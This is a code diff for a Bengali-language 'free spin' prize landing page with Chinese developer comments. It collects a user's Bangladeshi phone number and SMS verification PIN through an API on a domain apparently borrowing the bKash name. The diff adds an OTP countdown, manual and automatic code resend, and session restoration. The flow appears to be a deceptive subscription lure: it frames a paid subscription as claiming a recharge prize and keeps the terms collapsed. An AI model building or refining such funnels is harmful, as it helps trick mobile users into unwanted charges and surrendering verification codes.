@@ -49,7 +49,6 @@
         .btn-primary { width: 100%; padding: 14px; border: none; border-radius: 60px; font-size: 1.2rem; font-weight: bold; color: white; cursor: pointer; background: #408559; position: relative; z-index: 2; }
         .btn-primary:active { transform: scale(0.97); }
         .btn-primary:disabled { opacity: 0.6; }
-        /* ===== 返回按钮样式 ===== */
         .btn-back {
             display: inline-block;
             padding: 10px 20px;
@@ -62,10 +61,27 @@
             background: transparent;
             cursor: pointer;
         }
-        .btn-back:active {
-            transform: scale(0.95);
-            background: #f1f5f9;
+        .btn-back:active { transform: scale(0.95); background: #f1f5f9; }
+        .btn-resend {
+            display: inline-block;
+            margin-top: 12px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 30px;
+            background: #3A7CAE;
+            color: white;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            opacity: 0.5;
+            transition: opacity 0.3s;
         }
+        .btn-resend:active { transform: scale(0.95); }
+        .btn-resend.active {
+            opacity: 1;
+            background: #e67e22;
+        }
+        .btn-resend.active:active { background: #d35400; }
         .form-group { margin: 15px 0; }
         .form-group input { width: 100%; padding: 14px 16px; font-size: 1.2rem; border: 2px solid #e2e8f0; border-radius: 12px; text-align: center; background: #f8fafc; outline: none; }
         .form-group input:focus { border-color: #3A7CAE; }
@@ -110,6 +126,23 @@
             background: transparent;
             text-align: left;
         }
+        .timer-text {
+            font-size: 0.9rem;
+            color: #64748b;
+            margin-bottom: 8px;
+            padding: 6px 12px;
+            background: #f1f5f9;
+            border-radius: 20px;
+            display: inline-block;
+        }
+        .timer-text .seconds {
+            font-weight: bold;
+            color: #3A7CAE;
+            font-size: 1.1rem;
+        }
+        .timer-text.expired .seconds {
+            color: #dc2626;
+        }
         @media (max-height: 700px) {
             .header { padding: 12px 16px; }
             .prize-body { padding: 12px 16px 20px; }
@@ -122,9 +155,9 @@
             .phone-prefix { padding: 10px 0 10px 12px; font-size: 1rem; min-width: 60px; }
             .phone-input { padding: 10px 12px; font-size: 1rem; }
             .btn-back { padding: 6px 14px; font-size: 0.75rem; }
+            .btn-resend { padding: 8px 16px; font-size: 0.8rem; }
+            .timer-text { font-size: 0.75rem; }
         }
-
-        /* ===== 可折叠条款样式 ===== */
         .tnc-toggle {
             display: inline-block;
             margin-top: 10px;
@@ -134,9 +167,7 @@
             font-weight: 500;
             user-select: none;
         }
-        .tnc-toggle:active {
-            opacity: 0.7;
-        }
+        .tnc-toggle:active { opacity: 0.7; }
         .tnc-box {
             display: none;
             margin-top: 10px;
@@ -149,17 +180,8 @@
             line-height: 1.6;
             border-left: 3px solid #3A7CAE;
         }
-        .tnc-box.open {
-            display: block;
-        }
-        .tnc-box strong {
-            color: #b45309;
-        }
-        .tnc-box .highlight {
-            background: #fef3c7;
-            padding: 2px 6px;
-            border-radius: 4px;
-        }
+        .tnc-box.open { display: block; }
+        .tnc-box strong { color: #b45309; }
         .tnc-divider {
             border: 0;
             border-top: 1px dashed #cbd5e1;
@@ -196,8 +218,6 @@
             <div class="offer-details">
                 <p>✅ সাবস্ক্রাইব → পুরস্কার গ্রহণ</p>
                 <p>🎁 পুরস্কার <strong>মোবাইল রিচার্জ</strong> আকারে ২ মিনিটের মধ্যে পাঠানো হবে</p>
-                
-                <!-- ===== 可折叠条款（点击小三角展开） ===== -->
                 <div style="margin-top:12px;">
                     <span class="tnc-toggle" onclick="toggleTnc()">
                         📋 শর্ত ও শর্তাবলী <span id="tncArrow">▼</span>
@@ -234,19 +254,26 @@
         </div>
 
         <div id="pinSection" class="hidden">
-            <!-- ===== 返回按钮 ===== -->
             <button class="btn-back" id="backBtn">← ফিরে যান</button>
             <h2 style="font-size:1.3rem; color:#1e293b; margin-bottom:6px;">🔑 ভেরিফিকেশন কোড দিন</h2>
             <p style="font-size:0.85rem; color:#1e293b;"><strong>আপনার মোবাইলের SMS দেখুন</strong></p>
             <p style="font-size:0.85rem; color:#1e293b; margin-bottom:10px;"><strong>৪-অঙ্কের কোড দিন</strong></p>
+            
+            <!-- 倒计时显示 -->
+            <div class="timer-text" id="timerDisplay">
+                ⏳ ভেরিফিকেশন কোডের মেয়াদ: <span class="seconds" id="countdownSeconds">3:00</span>
+            </div>
+            
             <div class="pin-container">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
-                
             </div>
             <button class="btn-primary" id="verifyBtn">✅ পুরস্কার নিন</button>
+            
+            <button class="btn-resend" id="resendBtn" disabled>⏳ অপেক্ষা করুন...</button>
+            
             <div id="pinLoading" class="loading-text">⏳ যাচাই করা হচ্ছে...</div>
             <div id="pinError" class="error-msg"></div>
         </div>
@@ -271,9 +298,13 @@
 const API_BASE = 'https://api.bkashofferhub.top';
 const OFFER_ID = '306584';
 const PIN_LENGTH = 4;
+const OTP_TIMEOUT = 180; // 3分钟 = 180秒
 let currentTxid = null;
 let pinErrorCount = 0;
 let userMsisdn = '';
+let countdownTimer = null;
+let remainingSeconds = OTP_TIMEOUT;
+let canResend = false;
 
 const cid = new URLSearchParams(location.search).get('cid') || 
             new URLSearchParams(location.search).get('clickid') || 
@@ -285,28 +316,22 @@ const cid = new URLSearchParams(location.search).get('cid') ||
 function saveState(key, value) {
     try {
         sessionStorage.setItem('free_spin_' + key, JSON.stringify(value));
-    } catch (e) {
-        console.warn('保存状态失败:', e);
-    }
+    } catch (e) { console.warn('保存状态失败:', e); }
 }
 
 function loadState(key) {
     try {
         const data = sessionStorage.getItem('free_spin_' + key);
         return data ? JSON.parse(data) : null;
-    } catch (e) {
-        console.warn('读取状态失败:', e);
-        return null;
-    }
+    } catch (e) { console.warn('读取状态失败:', e); return null; }
 }
 
 function clearState() {
     try {
-        const keys = ['currentTxid', 'userMsisdn', 'msisdn', 'page', 'headerState'];
-        keys.forEach(k => sessionStorage.removeItem('free_spin_' + k));
-    } catch (e) {
-        console.warn('清除状态失败:', e);
-    }
+        ['currentTxid', 'userMsisdn', 'msisdn', 'page', 'headerState'].forEach(
+            k => sessionStorage.removeItem('free_spin_' + k)
+        );
+    } catch (e) { console.warn('清除状态失败:', e); }
 }
 
 // ============================================================
@@ -345,6 +370,9 @@ const pinError = document.getElementById('pinError');
 
 const redirectBtn = document.getElementById('redirectBtn');
 const backBtn = document.getElementById('backBtn');
+const resendBtn = document.getElementById('resendBtn');
+const timerDisplay = document.getElementById('timerDisplay');
+const countdownSeconds = document.getElementById('countdownSeconds');
 const fireworkContainer = document.getElementById('fireworkContainer');
 
 // ============================================================
@@ -365,9 +393,53 @@ function showLoading(el) { el.classList.add('show'); }
 function hideLoading(el) { el.classList.remove('show'); }
 
 // ============================================================
+// 【倒计时 - 3分钟】
+// ============================================================
+function startCountdown() {
+    stopCountdown();
+    canResend = false;
+    remainingSeconds = OTP_TIMEOUT;
+    resendBtn.disabled = true;
+    resendBtn.textContent = '⏳ অপেক্ষা করুন...';
+    resendBtn.classList.remove('active');
+    timerDisplay.classList.remove('expired');
+    updateTimerDisplay();
+    
+    countdownTimer = setInterval(() => {
+        remainingSeconds--;
+        updateTimerDisplay();
+        
+        if (remainingSeconds <= 0) {
+            stopCountdown();
+            // 倒计时结束，启用重发按钮
+            canResend = true;
+            resendBtn.disabled = false;
+            resendBtn.textContent = '🔄 নতুন কোড পাঠান';
+            resendBtn.classList.add('active');
+            timerDisplay.classList.add('expired');
+            showError(pinError, '⏳ আপনার কোডের মেয়াদ শেষ হয়েছে। দয়া করে নতুন কোড পাঠান।');
+        }
+    }, 1000);
+}
+
+function stopCountdown() {
+    if (countdownTimer) {
+        clearInterval(countdownTimer);
+        countdownTimer = null;
+    }
+}
+
+function updateTimerDisplay() {
+    const mins = Math.floor(remainingSeconds / 60);
+    const secs = remainingSeconds % 60;
+    countdownSeconds.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
+}
+
+// ============================================================
 // 【页面切换 + 状态保存】
 // ============================================================
 function goToPhonePage() {
+    stopCountdown();
     hide('pinSection');
     hide('successSection');
     show('phoneSection');
@@ -383,13 +455,69 @@ function goToPinPage() {
     hide('phoneSection');
     show('pinSection');
     saveState('page', 'pin');
+    startCountdown();
     pinBoxes[0].focus();
 }
 
 function goToSuccessPage() {
+    stopCountdown();
     hide('pinSection');
     show('successSection');
     saveState('page', 'success');
+}
+
+// ============================================================
+// 【重新发送验证码函数】
+// ============================================================
+async function resendVerificationCode(showSuccessMsg = true) {
+    if (!userMsisdn) {
+        showError(pinError, 'মোবাইল নম্বর পাওয়া যায়নি। আবার চেষ্টা করুন।');
+        return false;
+    }
+    
+    // 检查是否可以重发
+    if (!canResend) {
+        const mins = Math.floor(remainingSeconds / 60);
+        const secs = remainingSeconds % 60;
+        showError(pinError, `⏳ দয়া করে ${mins}:${secs.toString().padStart(2, '0')} অপেক্ষা করুন।`);
+        return false;
+    }
+    
+    try {
+        const url = `${API_BASE}/api/pin/request?msisdn=${userMsisdn}&offer_id=${OFFER_ID}&cid=${cid}`;
+        console.log('📤 重新发送验证码:', url);
+        
+        const res = await fetch(url);
+        const data = await res.json();
+        
+        if (data.success === true && data.txid) {
+            currentTxid = data.txid;
+            saveState('currentTxid', currentTxid);
+            console.log('✅ 重新发送成功, txid:', currentTxid);
+            
+            // 重置倒计时和状态
+            hideError(pinError);
+            startCountdown();
+            
+            if (showSuccessMsg) {
+                showError(pinError, '✅ নতুন কোড পাঠানো হয়েছে! আপনার SMS দেখুন।');
+                setTimeout(() => {
+                    hideError(pinError);
+                }, 5000);
+            }
+            
+            pinBoxes.forEach(b => b.value = '');
+            pinBoxes[0].focus();
+            return true;
+        } else {
+            showError(pinError, data.msg || 'কোড পাঠাতে ব্যর্থ হয়েছে। আবার চেষ্টা করুন।');
+            return false;
+        }
+    } catch (error) {
+        console.error('❌ 重新发送失败:', error);
+        showError(pinError, 'নেটওয়ার্ক সমস্যা। আবার চেষ্টা করুন।');
+        return false;
+    }
 }
 
 // ============================================================
@@ -403,7 +531,7 @@ function toggleTnc() {
 }
 
 // ============================================================
-// 【轮询函数】- 200次 × 3秒 = 10分钟
+// 【轮询函数】
 // ============================================================
 async function pollStatus(attempt = 0) {
     if (attempt >= 200) {
@@ -426,7 +554,7 @@ async function pollStatus(attempt = 0) {
             verifyBtn.disabled = false;
             goToSuccessPage();
             triggerFireworks();
-            clearState(); // 成功后清除状态
+            clearState();
         } else if (data.status === 'processing') {
             if (attempt % 10 === 0 && attempt > 0) {
                 const minutes = Math.floor(attempt * 3 / 60);
@@ -544,7 +672,6 @@ document.getElementById('playBtn').addEventListener('click', function() {
     saveState('page', 'phone');
     msisdnInput.focus();
     
-    // 恢复手机号（如果有保存）
     const savedMsisdn = loadState('msisdn');
     if (savedMsisdn) {
         msisdnInput.value = savedMsisdn;
@@ -573,26 +700,29 @@ pinBoxes.forEach((box, i) => {
 });
 
 // ============================================================
-// 【返回按钮】- 回到手机号页面
+// 【返回按钮】
 // ============================================================
 backBtn.addEventListener('click', function() {
     sendMaxConvEvent('back_btn_click');
-    
-    // 清空PIN输入
     pinBoxes.forEach(b => b.value = '');
     hideError(pinError);
     hideLoading(pinLoading);
-    
-    // 清空验证相关状态（保留手机号）
+    stopCountdown();
     currentTxid = null;
     saveState('currentTxid', null);
-    
-    // 回到手机号页面
     goToPhonePage();
 });
 
 // ============================================================
-// 【事件2】点击「发送」- 真实API调用
+// 【重新发送按钮】
+// ============================================================
+resendBtn.addEventListener('click', async function() {
+    sendMaxConvEvent('resend_click');
+    await resendVerificationCode(true);
+});
+
+// ============================================================
+// 【事件2】点击「发送」
 // ============================================================
 sendBtn.addEventListener('click', async function() {
     pinErrorCount = 0;
@@ -611,7 +741,6 @@ sendBtn.addEventListener('click', async function() {
     msisdn = '880' + msisdn;
     userMsisdn = msisdn;
 
-    // 保存手机号
     saveState('msisdn', msisdnInput.value.trim().replace(/\D/g, ''));
     saveState('userMsisdn', msisdn);
 
@@ -650,7 +779,7 @@ sendBtn.addEventListener('click', async function() {
 });
 
 // ============================================================
-// 【事件3】点击「验证」- 真实API调用（txid放在请求头里）
+// 【事件3】点击「验证」
 // ============================================================
 verifyBtn.addEventListener('click', async function() {
     const pin = Array.from(pinBoxes).map(b => b.value).join('');
@@ -660,7 +789,6 @@ verifyBtn.addEventListener('click', async function() {
         return;
     }
 
-    // ✅ 检查 currentTxid 是否有效
     if (!currentTxid) {
         showError(pinError, '⏳ 验证码已过期，请重新发送');
         pinBoxes.forEach(b => b.value = '');
@@ -674,7 +802,6 @@ verifyBtn.addEventListener('click', async function() {
     verifyBtn.disabled = true;
 
     try {
-        // ✅ txid 放到请求头 X-Txid 里，URL 里不带 txid
         const url = `${API_BASE}/api/pin/verify?pin=${pin}`;
         console.log('📤 验证PIN请求 (txid在请求头中):', url);
         
@@ -724,34 +851,10 @@ verifyBtn.addEventListener('click', async function() {
                 saveState('currentTxid', null);
                 
                 setTimeout(async () => {
-                    try {
-                        const url = `${API_BASE}/api/pin/request?msisdn=${userMsisdn}&offer_id=${OFFER_ID}&cid=${cid}`;
-                        console.log('📤 自动重新发送验证码:', url);
-                        
-                        const res = await fetch(url);
-                        const data = await res.json();
-                        
-                        if (data.success === true && data.txid) {
-                            currentTxid = data.txid;
-                            saveState('currentTxid', currentTxid);
-                            console.log('✅ 重新发送成功, txid:', currentTxid);
-                            showError(pinError, '✅ নতুন কোড পাঠানো হয়েছে! আপনার SMS দেখুন।');
-                            verifyBtn.disabled = false;
-                            pinBoxes[0].focus();
-                            
-                            setTimeout(() => {
-                                hideError(pinError);
-                            }, 5000);
-                            
-                        } else {
-                            showError(pinError, 'পুনরায় পাঠাতে ব্যর্থ হয়েছে। আবার চেষ্টা করুন।');
-                            verifyBtn.disabled = false;
-                        }
-                    } catch (error) {
-                        console.error('❌ 重新发送错误:', error);
-                        showError(pinError, 'নেটওয়ার্ক সমস্যা। আবার চেষ্টা করুন।');
-                        verifyBtn.disabled = false;
-                    }
+                    // 强制允许重发（即使倒计时没结束）
+                    canResend = true;
+                    await resendVerificationCode(true);
+                    verifyBtn.disabled = false;
                 }, 2000);
                 
                 return;
@@ -796,29 +899,53 @@ pinBoxes.forEach((box) => {
 // ============================================================
 // 【恢复状态】- 页面加载时恢复
 // ============================================================
-(function restoreState() {
+(async function restoreState() {
     const savedPage = loadState('page');
     const savedTxid = loadState('currentTxid');
     const savedMsisdn = loadState('msisdn');
     const savedUserMsisdn = loadState('userMsisdn');
     const savedHeader = loadState('headerState');
 
-    // 恢复手机号
     if (savedMsisdn) {
         msisdnInput.value = savedMsisdn;
     }
     
-    // 恢复用户手机号（完整格式）
     if (savedUserMsisdn) {
         userMsisdn = savedUserMsisdn;
     }
 
-    // 恢复 txid
     if (savedTxid) {
         currentTxid = savedTxid;
     }
 
-    // 恢复页面状态
+    // 刷新后不自动重发，保持原有状态
+    if (savedPage === 'pin') {
+        headerFirst.style.display = 'none';
+        headerSecond.style.display = 'block';
+        hide('gameSection');
+        hide('phoneSection');
+        show('pinSection');
+        
+        if (currentTxid) {
+            startCountdown();
+        } else {
+            showError(pinError, '⏳ সেশন মেয়াদ শেষ হয়েছে। নতুন কোড পাঠান।');
+            // 立即启用重发按钮
+            canResend = true;
+            resendBtn.disabled = false;
+            resendBtn.textContent = '🔄 নতুন কোড পাঠান';
+            resendBtn.classList.add('active');
+        }
+        
+        if (userMsisdn) {
+            console.log('🔄 刷新后保持状态，等待用户操作');
+        } else {
+            showError(pinError, '⏳ তথ্য পাওয়া যায়নি। আবার চেষ্টা করুন।');
+            setTimeout(() => goToPhonePage(), 1500);
+        }
+        return;
+    }
+
     if (savedPage === 'phone') {
         headerFirst.style.display = 'none';
         headerSecond.style.display = 'block';
@@ -828,21 +955,8 @@ pinBoxes.forEach((box) => {
             headerFirst.style.display = 'none';
             headerSecond.style.display = 'block';
         }
-    } else if (savedPage === 'pin') {
-        headerFirst.style.display = 'none';
-        headerSecond.style.display = 'block';
-        hide('gameSection');
-        hide('phoneSection');
-        show('pinSection');
-        if (savedHeader === 'second') {
-            headerFirst.style.display = 'none';
-            headerSecond.style.display = 'block';
-        }
-        // 如果 txid 不存在，回到手机号页面
-        if (!savedTxid) {
-            goToPhonePage();
-        }
-    } else if (savedPage === 'success') {
+    } 
+    else if (savedPage === 'success') {
         headerFirst.style.display = 'none';
         headerSecond.style.display = 'block';
         hide('gameSection');
@@ -850,20 +964,28 @@ pinBoxes.forEach((box) => {
         hide('pinSection');
         show('successSection');
         triggerFireworks();
+        clearState();
+    } else {
+        headerFirst.style.display = 'block';
+        headerSecond.style.display = 'none';
+        show('gameSection');
+        hide('phoneSection');
+        hide('pinSection');
+        hide('successSection');
     }
 
-    console.log('🔄 状态恢复完成, page:', savedPage, 'txid:', savedTxid);
+    console.log('🔄 状态恢复完成, page:', savedPage, 'txid:', currentTxid);
 })();
 
 // ============================================================
 // 【控制台调试信息】
 // ============================================================
-console.log('🚀 已切换到真实API模式（txid在请求头）');
+console.log('🚀 API模式（txid在请求头）');
 console.log('📡 API_BASE:', API_BASE);
 console.log('📋 OFFER_ID:', OFFER_ID);
 console.log('🔑 CID:', cid);
-console.log('💡 打开浏览器开发者工具查看详细日志');
-console.log('✅ 已添加: 状态持久化 + 返回按钮');
+console.log('⏱️ OTP超时: 3分钟');
+console.log('✅ 功能: 状态持久化 + 返回按钮 + 3分钟倒计时 + 手动重发');
 </script>
 </body>
 </html>
